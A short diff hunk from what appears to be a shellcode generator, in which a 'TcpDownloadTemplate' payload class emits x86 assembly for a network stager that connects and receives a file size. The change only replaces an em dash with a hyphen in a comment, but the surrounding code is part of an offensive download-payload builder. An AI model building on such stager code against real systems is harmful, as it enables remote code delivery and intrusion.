@@ -115,7 +115,7 @@ class TcpDownloadTemplate(PayloadTemplate):
             *safe_push_mem("ebp", sock_h_off, bc),
             *safe_call_mem("ebp", conn_off, bc),
             "",
-            "    ; recv(socket, &bytes_total, 4, 0) — read 4-byte file size",
+            "    ; recv(socket, &bytes_total, 4, 0) - read 4-byte file size",
             "    xor  eax, eax",
             *safe_lea("ecx", "ebp", bytes_total_off, bc),
             "    push eax                    ; flags = 0",
